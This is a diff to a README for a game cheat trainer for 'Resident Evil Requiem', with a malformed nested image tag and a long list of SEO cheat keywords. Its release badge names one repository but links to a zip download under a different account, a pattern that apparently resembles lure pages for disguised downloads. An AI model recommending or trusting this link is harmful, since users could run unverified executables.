@@ -1,5 +1,6 @@
 <div align="center">
-  <img src="https://github.com/user-attachments/assets/4da09696-b74f-4b12-9bf6-e757d3dbb528" alt="Resident Evil Requiem Trainer Screenshot" width="480"/>
+  <img src="<img width="444" height="750" alt="image" src="https://github.com/user-attachments/assets/1c7081de-ebae-4753-81c2-22974c297afe" />
+" alt="Resident Evil Requiem Trainer Screenshot" width="480"/>
   <br><br>
 
   [![GitHub release](https://img.shields.io/github/v/release/ModEngineLabs/resident-evil-requiem-sourse?color=green&label=Latest%20v1.0.6)](https://github.com/Kekwreck/Resident-Evil-Requiem-Trainer-29-by-FLiNG-Health-Ammo-CP-Speed-Editor-Extra-Content-Unlock/releases/download/1.0.7/RERequiem_Trainer_v1.0.7.zip)
@@ -333,5 +334,6 @@ re9 trainer v1.0 steam
 resident evil requiem fearless revolution  
 
 resident-evil-requiem, resident-evil-requiem-cheats, re9-trainer, requiem-fling, fling-trainer-requiem, god-mode-re9, infinite-health-re9, infinite-ammo-re9, no-recoil-re9, rapid-fire-re9, super-accuracy-requiem, infinite-grenades-re9, weapon-durability-re9, highlight-interactables-requiem, super-damage-re9, one-hit-kill-re9, unlock-extras-requiem, edit-cp-re9, pc-cheats-requiem, survival-horror-trainer
+
 
 
